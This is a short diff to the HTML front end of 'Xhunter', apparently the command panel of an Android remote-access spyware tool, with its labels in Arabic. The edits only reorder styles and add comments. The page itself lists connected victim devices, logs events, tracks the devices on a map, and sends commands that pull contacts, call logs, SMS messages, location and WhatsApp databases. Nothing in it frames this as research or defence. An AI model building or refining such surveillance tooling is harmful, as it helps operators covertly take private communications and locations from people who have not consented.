@@ -4,8 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>نظام استخبارات Xhunter</title>
-<link rel="stylesheet" href="style.css">
 <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+<link rel="stylesheet" href="style.css">
 </head>
 <body>
 <header>
@@ -13,31 +13,37 @@
 </header>
 
 <div id="mainContainer">
+  <!-- الأجهزة المتصلة -->
   <section id="devices">
     <h2>الأجهزة المتصلة</h2>
     <ul id="deviceList"></ul>
   </section>
 
+  <!-- سجل الأحداث -->
   <section id="events">
     <h2>سجل الأحداث</h2>
     <ul id="logList"></ul>
   </section>
 
+  <!-- أوامر الأجهزة -->
   <section id="commands">
     <h2>أوامر الأجهزة</h2>
-    <select id="deviceSelect"></select>
-    <select id="commandAction">
-      <option value="getInstalledApps">التطبيقات المثبتة</option>
-      <option value="getContacts">جهات الاتصال</option>
-      <option value="getCallLog">سجل المكالمات</option>
-      <option value="getSMS">الرسائل</option>
-      <option value="getLocation">الموقع</option>
-      <option value="downloadWhatsappDatabase">واتساب</option>
-    </select>
-    <input type="text" id="commandData" placeholder="بيانات JSON إذا لزم الأمر">
-    <button id="sendCommand">إرسال</button>
+    <div class="commandRow">
+      <select id="deviceSelect"></select>
+      <select id="commandAction">
+        <option value="getInstalledApps">التطبيقات المثبتة</option>
+        <option value="getContacts">جهات الاتصال</option>
+        <option value="getCallLog">سجل المكالمات</option>
+        <option value="getSMS">الرسائل</option>
+        <option value="getLocation">الموقع</option>
+        <option value="downloadWhatsappDatabase">واتساب</option>
+      </select>
+      <input type="text" id="commandData" placeholder="بيانات JSON إذا لزم الأمر">
+      <button id="sendCommand">إرسال</button>
+    </div>
   </section>
 
+  <!-- الخريطة -->
   <section id="mapSection">
     <h2>خريطة تتبع الأجهزة</h2>
     <div id="map"></div>
